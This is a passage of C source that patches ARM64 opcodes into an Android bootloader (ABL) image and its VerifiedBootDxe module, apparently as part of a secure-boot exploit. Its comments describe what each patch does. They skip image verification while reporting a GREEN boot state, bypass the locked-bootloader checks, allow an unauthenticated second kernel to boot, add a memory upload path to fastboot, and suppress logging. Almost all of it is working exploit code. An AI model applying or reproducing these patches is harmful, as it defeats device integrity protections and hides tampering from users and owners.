        OPCODE(ablcode + 0x28DDC + 0x34, 0x17, 0x00, 0x00, 0x14);  // b     #0x5c = [ 17 00 00 14 ]                 continue to "upload" after syncing cache to memory

        OPCODE(ablcode + 0x28EE0 + 0x00, 0x1f, 0x20, 0x03, 0xd5);  // nop = [ 1f 20 03 d5 ]                         avoid the original set of download mode to 0x01 in cmd "download:"

        // instead of fixed value of 0x01 aka ENDPOINT_IN, switched to ENDPOINT_OUT if indicated by extended state in fastboot_download_mode_512MB_active
        // so it can be set via "erase:0x" or "erase:0X" command to 0x81 aka ENDPOINT_OUT alternativ
        OPCODE(ablcode + 0x24C80 + 0x00, 0x2d, 0x10, 0x80, 0x52);  // mov   w13, #0x81 = [ 2d 10 80 52 ]
        OPCODE(ablcode + 0x24C80 + 0x04, 0xae, 0x62, 0x58, 0x39);  // ldrb   w14, [x21, #0x618] = [ ae 62 58 39 ]   fastboot_download_mode_512MB_active
        OPCODE(ablcode + 0x24C80 + 0x08, 0xdf, 0x05, 0x00, 0x71);  // cmp   w14, #0x01 = [ df 05 00 71 ]
        OPCODE(ablcode + 0x24C80 + 0x0c, 0x00, 0x00, 0x8d, 0x9a);  // csel  x0, x0, x13, eq = [ 00 00 8d 9a ]
        OPCODE(ablcode + 0x24C80 + 0x10, 0x80, 0x02, 0x3f, 0xd6);  // blr   x20 = [ 80 02 3f d6 ]                   (orig inst from 0x24C80)
        OPCODE(ablcode + 0x24C80 + 0x14, 0x03, 0x00, 0x00, 0x14);  // b     #0x0c = [ 03 00 00 14 ]

        OPCODE(ablcode + 0x23A44 + 0x00, 0xcb, 0x0d, 0x00, 0x54);  // b.lt  #0x1b8 = [ cb 0d 00 54 ]                fix branch condition to reflect extended states in fastboot_download_mode_512MB_active

        // this is to reset fastboot_download_mode_512MB_active to zero right after download/upload finished before sending fastboot status
        OPCODE(ablcode + 0x24B60 + 0x00, 0xde, 0xff, 0xff, 0x17);  // b     #-0x88 = [ de ff ff 17 ]                jump after branch of following code
        OPCODE(ablcode + 0x24AD4 + 0x00, 0x07, 0x00, 0x00, 0x14);  // b     #0x1c = [ 07 00 00 14 ]                 make some room for additional code
        OPCODE(ablcode + 0x24AD4 + 0x04, 0x95, 0x06, 0x00, 0x90);  // adrp  x21, #0xd0000 = [ 95 06 00 90 ]         fastboot_download_mode_512MB_active@PAGE  (0xf4618)
        OPCODE(ablcode + 0x24AD4 + 0x08, 0xbf, 0x62, 0x18, 0x39);  // strb  wzr, [x21, #0x618]  = [ bf 62 18 39 ]   fastboot_download_mode_512MB_active = 0
        OPCODE(ablcode + 0x24AD4 + 0x10, 0x00, 0x08, 0x80, 0x52);  // mov   w0, #0x40 = [ 00 08 80 52 ]             orig instruction from 0x24B60
        OPCODE(ablcode + 0x24AD4 + 0x14, 0x20, 0x00, 0x00, 0x14);  // b     #0x80 = [ 20 00 00 14 ]                 jump back to continue


        // extend usb transfer state machine with states to handle upload in download command
        OPCODE(ablcode + 0x23A2C + 0x00, 0xa0, 0x09, 0x00, 0x54);  // b.eq  #0x134 = [ a0 09 00 54 ]                jump after the debug level check so we can use that for a patch
        OPCODE(ablcode + 0x23B34 + 0x00, 0x81, 0x00, 0x00, 0x54);  // b.ne  #0x10 = [ 81 00 00 54 ]                 go to check additional mode values if it is not the orig dnld

        OPCODE(ablcode + 0x23B44 + 0x00, 0x9f, 0x0e, 0x00, 0x71);  // cmp   w20, #0x03 = [ 9f 0e 00 71 ]            is this download switched to upload mode?
        OPCODE(ablcode + 0x23B44 + 0x04, 0xa1, 0x01, 0x00, 0x54);  // b.ne  #0x34 = [ a1 01 00 54 ]                 branch to check for upload continue machine state
        OPCODE(ablcode + 0x23B44 + 0x08, 0x88, 0x09, 0x00, 0x94);  // bl    #0x2620 = [ 88 09 00 94 ]               get_fastboot_download_mode_512MB_buffer_ptr
        OPCODE(ablcode + 0x23B44 + 0x0c, 0xe2, 0x03, 0x00, 0xaa);  // mov   x2, x0 = [ e2 03 00 aa ]
        OPCODE(ablcode + 0x23B44 + 0x10, 0x20, 0x10, 0x80, 0x52);  // mov   w0, 0x81 = [ 20 10 80 52 ]
        OPCODE(ablcode + 0x23B44 + 0x14, 0xb0, 0x00, 0x80, 0x52);  // mov   w16, #0x05 = [ b0 00 80 52 ]
        OPCODE(ablcode + 0x23B44 + 0x18, 0xe5, 0xff, 0xff, 0x17);  // b     #-0x6c = [ e5 ff ff 17 ]                continue to 0x23AF0 address with following code:

        OPCODE(ablcode + 0x23AEC + 0x00, 0x07, 0x00, 0x00, 0x14);  // b     #0x1c = [ 07 00 00 14 ]                 jump after the debug level check so we can use that for a patch
        OPCODE(ablcode + 0x23AEC + 0x04, 0x91, 0x06, 0x00, 0xb0);  // adrp  x17, #0xd1000 = [ 91 06 00 b0 ]         fastboot_download_mode_512MB_active@PAGE
        OPCODE(ablcode + 0x23AEC + 0x08, 0x30, 0x62, 0x18, 0x39);  // strb  w16, [x17, #0x618] = [ 30 62 18 39 ]    fastboot_download_mode_512MB_active = 0x03   i.e. upload started
        OPCODE(ablcode + 0x23AEC + 0x0c, 0x55, 0x00, 0x00, 0x14);  // b     #0x154 = [ 55 00 00 14 ]                branch to the usb send function after set of endpoint, we use 0x81 instead

        OPCODE(ablcode + 0x23B78 + 0x00, 0x40, 0x00, 0x00, 0x14);  // b     #0x100 = [ 40 00 00 14 ]                jump after the debug level check so we can use that for a patch
        OPCODE(ablcode + 0x23B78 + 0x04, 0x9f, 0x16, 0x00, 0x71);  // cmp   w20, #0x05 = [ 9f 16 00 71 ]            is this download switched to upload mode, upload continue state?
        OPCODE(ablcode + 0x23B78 + 0x08, 0xe1, 0x05, 0x00, 0x54);  // b.ne  #0xbc = [ e1 05 00 54 ]                 if not, branch to the setup of fastboot command usb receive mode default
        OPCODE(ablcode + 0x23B78 + 0x0c, 0x7a, 0x09, 0x00, 0x94);  // bl    #0x25e8 = [ 7a 09 00 94 ]               get_fastboot_download_mode_512MB_buffer_ptr
        OPCODE(ablcode + 0x23B78 + 0x10, 0xe1, 0x03, 0x00, 0xaa);  // mov   x1, x0 = [ e1 03 00 aa ]
        OPCODE(ablcode + 0x23B78 + 0x14, 0xe0, 0x0f, 0x40, 0xf9);  // ldr   x0, [sp, #0x18] = [ e0 0f 40 f9 ]
        OPCODE(ablcode + 0x23B78 + 0x18, 0xc8, 0x03, 0x00, 0x94);  // bl    #0x0f20 = [ c8 03 00 94 ]               call "DataReady %d\n" / "Download Finished\n" function
        OPCODE(ablcode + 0x23B78 + 0x1c, 0x1f, 0x00, 0x00, 0x14);  // b     #0x7c = [ 1f 00 00 14 ]                 jump to end of this function bellow returning zero status

        OPCODE(ablcode + 0x56164, 0xe8, 0x03, 0x1f, 0x2a);         // mov   w8, wzr = [ e8 03 1f 2a ]               do not log XReplace start
        OPCODE(ablcode + 0x562B0, 0xea, 0x03, 0x1f, 0x2a);         // mov   w10, wzr = [ ea 03 1f 2a ]              do not log XReplace end

        if (extended > 0) {
            OPCODE(ablcode + 0x286DC, 0x1f, 0x20, 0x03, 0xd5);     // nop = [ 1f 20 03 d5 ]                         do not jump to "Command not allowed" when handling 'boot' cmd

            // following not needed as we skip it already within the 2nd stage exploit
            //OPCODE(ablcode + 0x264D0, 0x1f, 0x20, 0x03, 0xd5);     // nop = [ 1f 20 03 d5 ]                         do not jump to "Flashing is not allowed in Lock State" in 'flash' cmd
            //OPCODE(ablcode + 0x282C4, 0x1f, 0x20, 0x03, 0xd5);     // nop = [ 1f 20 03 d5 ]                         do not jump to "Erase is not allowed in Lock State" in 'erase' cmd
        }

        if (extended > 1) {
            if (cmdline[0] != '\0') {
                strcpy(ablcode, cmdline);
                OPCODE(ablcode + 0x09258 + 0x00, 0xa1, 0xff, 0xff, 0xf0); // adrp  x1, #-0x9000 = [ a1 ff ff f0 ]
                OPCODE(ablcode + 0x09258 + 0x04, 0xe0, 0x03, 0x13, 0xaa); // mov   x0, x19 = [ e0 03 13 aa ]
                OPCODE(ablcode + 0x09258 + 0x08, 0x5c, 0x00, 0x00, 0x94); // bl    #0x0170 = [ 5c 00 00 94 ]
                OPCODE(ablcode + 0x09258 + 0x0c, 0x32, 0xfe, 0xff, 0x17); // b     #-0x0738 = [ 32 fe ff 17 ]
            }
            if (cmdlinex[0] != '\0') {
                if (cmdline[0] != '\0')
                    OPCODE(ablcode + 0x09258 + 0x0c, 0x1f, 0x20, 0x03, 0xd5); // nop = [ 1f 20 03 d5 ]
                else
                    OPCODE(ablcode + 0x09258 + 0x00, 0x04, 0x00, 0x00, 0x14); // b     #0x10 = [ 04 00 00 14 ]
                strcpy(ablcode + 0x00800, cmdlinex);
                OPCODE(ablcode + 0x09258 + 0x10, 0x1c, 0x07, 0x00, 0x90); // adrp  x28, #0xe0000 = [ 1c 07 00 90 ]
                OPCODE(ablcode + 0x09258 + 0x14, 0x9c, 0xd3, 0x43, 0xf9); // ldr   x28, [x28, #0x7a0] = [ 9c d3 43 f9 ]
                OPCODE(ablcode + 0x09258 + 0x18, 0x80, 0x43, 0x40, 0xf9); // ldr   x0, [x28, #0x80] = [ 80 43 40 f9 ]
                OPCODE(ablcode + 0x09258 + 0x1c, 0xa1, 0xff, 0xff, 0xf0); // adrp  x1, #-0x9000 = [ a1 ff ff f0 ]
                OPCODE(ablcode + 0x09258 + 0x20, 0x21, 0x00, 0x20, 0x91); // add   x1, x1, #0x800 = [ 21 00 20 91 ]
                OPCODE(ablcode + 0x09258 + 0x24, 0xf5, 0xb4, 0x00, 0x94); // bl    #0x2d3d4 = [ f5 b4 00 94 ]
                OPCODE(ablcode + 0x09258 + 0x28, 0x80, 0x43, 0x00, 0xf9); // str   x0, [x28, #0x80] = [ 80 43 00 f9 ]
                OPCODE(ablcode + 0x09258 + 0x2c, 0x2a, 0xfe, 0xff, 0x17); // b     #-0x0758 = [ 2a fe ff 17 ]
            }

            OPCODE(ablcode + 0x33A94 + 0x00, 0xa0, 0x05, 0x00, 0x90); // adrp  x0, #0xb4000 = [ a0 05 00 90 ]       byte at 0xe7d6d is override_flag created in align space
            OPCODE(ablcode + 0x33A94 + 0x04, 0x00, 0xb4, 0x75, 0x39); // ldrb  w0, [x0, #0xd6d] = [ 00 b4 75 39 ]
            OPCODE(ablcode + 0x33A94 + 0x08, 0x60, 0x00, 0x00, 0x34); // cbz   w0, #0x0c = [ 60 00 00 34 ]
            OPCODE(ablcode + 0x33A94 + 0x0c, 0x00, 0x04, 0x00, 0x51); // sub   w0, w0, #0x01 = [ 00 04 00 51 ]
            OPCODE(ablcode + 0x33A94 + 0x10, 0x60, 0x42, 0x00, 0xb9); // str   w0, [x19, #0x40] = [ 60 42 00 b9 ]
            OPCODE(ablcode + 0x33A94 + 0x14, 0x06, 0x00, 0x00, 0x14); // b     #0x18 = [ 06 00 00 14 ]

            OPCODE(ablcode + 0x332E4 + 0x00, 0xfe, 0x03, 0x00, 0xaa); // mov   x30, x0 = [ fe 03 00 aa ]
            OPCODE(ablcode + 0x33320 + 0x00, 0xa8, 0x05, 0x00, 0x90); // adrp  x8, #0xb4000 = [ a8 05 00 90 ]       byte at 0xe7d6e is override_flag created in align space
            OPCODE(ablcode + 0x33320 + 0x04, 0x09, 0xb9, 0x75, 0x39); // ldrb  w9, [x8, #0xd6e] = [ 09 b9 75 39 ]
            OPCODE(ablcode + 0x33320 + 0x08, 0x69, 0x00, 0x00, 0x34); // cbz   w9, #0x0c = [ 69 00 00 34 ]
            OPCODE(ablcode + 0x33320 + 0x0c, 0x20, 0x05, 0x00, 0x51); // sub   w0, w9, #0x01 = [ 20 05 00 51 ]
            OPCODE(ablcode + 0x33320 + 0x10, 0xc0, 0x7b, 0x00, 0xb9); // str   w0, [x30, #0x78] = [ c0 7b 00 b9 ]

            OPCODE(ablcode + 0x28914, 0x1f, 0x20, 0x03, 0xd5);        // nop = [ 1f 20 03 d5 ]
            OPCODE(ablcode + 0x24198, 0x1f, 0x20, 0x03, 0xd5);        // nop = [ 1f 20 03 d5 ]
            OPCODE(ablcode + 0x01660, 0x1f, 0x20, 0x03, 0xd5);        // nop = [ 1f 20 03 d5 ]
            OPCODE(ablcode + 0x288C0, 0xe0, 0x03, 0x1f, 0xaa);        // mov   x0, xzr = [ e0 03 1f aa ]

            OPCODE(ablcode + 0x01080 + 0x00, 0x3b, 0x94, 0x00, 0x94); // bl    #0x250ec = [ 3b 94 00 94 ]
            OPCODE(ablcode + 0x01080 + 0x04, 0xe8, 0xff, 0xff, 0xf0); // adrp  x8, #-0x1000 = [ e8 ff ff f0 ]
            OPCODE(ablcode + 0x01080 + 0x08, 0x29, 0x07, 0x00, 0xd0); // adrp  x9, #0xe6000 = [ 29 07 00 d0 ]
            OPCODE(ablcode + 0x01080 + 0x0c, 0x28, 0x01, 0x08, 0xcb); // sub   x8, x9, x8 = [ 28 01 08 cb ]
            OPCODE(ablcode + 0x01080 + 0x10, 0x08, 0x00, 0x08, 0x8b); // add   x8, x0, x8 = [ 08 00 08 8b ]
            OPCODE(ablcode + 0x01080 + 0x14, 0xe1, 0x07, 0x00, 0x90); // adrp  x1, #0xfc000 = [ e1 07 00 90 ]
            OPCODE(ablcode + 0x01080 + 0x18, 0x00, 0x85, 0x40, 0xf8); // ldr   x0, [x8], #0x08 = [ 00 85 40 f8 ]
            OPCODE(ablcode + 0x01080 + 0x1c, 0x20, 0x85, 0x00, 0xf8); // str   x0, [x9], #0x08 = [ 20 85 00 f8 ]
            OPCODE(ablcode + 0x01080 + 0x20, 0x3f, 0x01, 0x01, 0xeb); // cmp   x9, x1 = [ 3f 01 01 eb ]
            OPCODE(ablcode + 0x01080 + 0x24, 0xa3, 0xff, 0xff, 0x54); // b.lo  #-0x0c = [ a3 ff ff 54 ]
            OPCODE(ablcode + 0x01080 + 0x28, 0xec, 0xff, 0xff, 0x17); // b     #-0x50 = [ ec ff ff 17 ]

            *(uint16_t *)(ablcode + 0xe7d6d) = override_flag;
        }

        if (extended > 2)
            p114_test8_patch(ablcode, 0, 0);
}

static const int p114_vb_size = 0xc000;

static void p114_test6_patch(unsigned char *vbcode, int size, int offset)
{
        OPCODE(vbcode + 0x25FC, 0x3d, 0x00, 0x00, 0x14);           // b     #0xf4 = [ 3d 00 00 14 ]          skip image verification in VerifiedBootDxe module with GREEN
        //OPCODE(vbcode + 0x25FC, 0x39, 0x00, 0x00, 0x14);           // b     #0xe4 = [ 39 00 00 14 ]          skip image verification in VerifiedBootDxe module with RED
}

static void p114_test7_patch(unsigned char *ablcode, int size, int offset)
{
        OPCODE(ablcode + 0x08FB8, 0x23, 0x00, 0x80, 0xd2);         // mov   x3, #0x01 = [ 23 00 80 d2 ]      force "orange" in kernel command line
}

static void p114_test8_patch(unsigned char *ablcode, int size, int offset)
{
        OPCODE(ablcode + 0x286D4 + 0x00, 0x94, 0x22, 0x00, 0x51);  // sub   w20, w20, #0x08 = [ 94 22 00 51 ]
        OPCODE(ablcode + 0x286D4 + 0x04, 0x74, 0x6a, 0x74, 0xf8);  // ldr   x20, [x19, x20] = [ 74 6a 74 f8 ]    get the size of the first kernel image from the end of buffer
        OPCODE(ablcode + 0x286D4 + 0x08, 0x16, 0x00, 0x00, 0x14);  // b     #0x58 = [ 16 00 00 14 ]              skip checking for unlocked bootloader and returning errors if locked
        OPCODE(ablcode + 0x286D4 + 0x0c, 0x62, 0x02, 0x14, 0x8b);  // add   x2, x19, x20 = [ 62 02 14 8b ]
        OPCODE(ablcode + 0x286D4 + 0x10, 0xe1, 0x03, 0x13, 0xaa);  // mov   x1, x19 = [ e1 03 13 aa ]
        OPCODE(ablcode + 0x286D4 + 0x14, 0x54, 0x84, 0x40, 0xf8);  // ldr   x20, [x2], #0x08 = [ 54 84 40 f8 ]   get the size of the second kernel image
        OPCODE(ablcode + 0x286D4 + 0x18, 0xb4, 0x56, 0x00, 0xf9);  // str   x20, [x21, #0xa8] = [ b4 56 00 f9 ]  update the kernel image size to boot
        OPCODE(ablcode + 0x286D4 + 0x1c, 0x63, 0x02, 0x14, 0x8b);  // add   x3, x19, x20 = [ 63 02 14 8b ]
        OPCODE(ablcode + 0x286D4 + 0x20, 0x40, 0x84, 0x40, 0xf8);  // ldr   x0, [x2], #0x08 = [ 40 84 40 f8 ]
        OPCODE(ablcode + 0x286D4 + 0x24, 0x20, 0x84, 0x00, 0xf8);  // str   x0, [x1], #0x08 = [ 20 84 00 f8 ]
        OPCODE(ablcode + 0x286D4 + 0x28, 0x3f, 0x00, 0x03, 0xeb);  // cmp   x1, x3 = [ 3f 00 03 eb ]
        OPCODE(ablcode + 0x286D4 + 0x2c, 0xa3, 0xff, 0xff, 0x54);  // b.lo  #-0x0c = [ a3 ff ff 54 ]
        OPCODE(ablcode + 0x286D4 + 0x30, 0x7f, 0x00, 0x00, 0xf9);  // str   xzr, [x3] = [ 7f 00 00 f9 ]
        OPCODE(ablcode + 0x286D4 + 0x34, 0x0b, 0x00, 0x00, 0x14);  // b     #0x2c = [ 0b 00 00 14 ]              jmp to check the second kernel moved to the place of 1st one
        OPCODE(ablcode + 0x286D4 + 0x38, 0x61, 0x6a, 0x74, 0xf8);  // ldr   x1, [x19, x20] = [ 61 6a 74 f8 ]     check if we have size for the second kernel image there
        OPCODE(ablcode + 0x286D4 + 0x3c, 0xe0, 0x63, 0x00, 0x91);  // add   x0, sp, #0x18 = [ e0 63 00 91 ]      orig instruction from 0x28810
        OPCODE(ablcode + 0x286D4 + 0x40, 0x21, 0x09, 0x00, 0xb4);  // cbz   x1, #0x124 = [ 21 09 00 b4 ]         on second kernel skip image auth and go to boot it
        OPCODE(ablcode + 0x286D4 + 0x44, 0x3f, 0x00, 0x00, 0x14);  // b     #0xfc = [ 3f 00 00 14 ]              continue with auth of the first kernel

        OPCODE(ablcode + 0x28810 + 0x00, 0xbf, 0xff, 0xff, 0x17);  // b     #-0x104 = [ bf ff ff 17 ]            hook before image auth to decide if to skip it
        OPCODE(ablcode + 0x2881C + 0x00, 0x29, 0xf6, 0xff, 0xb4);  // cbz   x9, #-0x13c = [ 29 f6 ff b4 ]        continue with patched code after the first image auth (0x286D4 + 0x0c)
}

static void p114_test9_patch(unsigned char *vbcode, int size, int offset)
{
        OPCODE(vbcode + 0x0259C + 0x00, 0xc2, 0x00, 0x00, 0x10);   // adr   x2, #0x18 = [ c2 00 00 10 ]
        OPCODE(vbcode + 0x0259C + 0x04, 0x42, 0x00, 0x40, 0xb9);   // ldr   w2, [x2] = [ 42 00 40 b9 ]
        //OPCODE(vbcode + 0x0259C + 0x08, 0x51, 0x00, 0x00, 0xd0); // adrp  x17, #0xa000
        //OPCODE(vbcode + 0x0259C + 0x0c, 0x22, 0x82, 0x02, 0xb9); // str   w2, [x17, #0x280]
        OPCODE(vbcode + 0x0259C + 0x10, 0x62, 0x2e, 0x00, 0xb9);   // str   w2, [x19, #0x2c] = [ 62 2e 00 b9 ]
        OPCODE(vbcode + 0x0259C + 0x14, 0x05, 0x00, 0x00, 0x14);   // b     #0x14 = [ 05 00 00 14 ]
        *(uint32_t *)(vbcode + 0x0259C + 0x18) = offset;
}
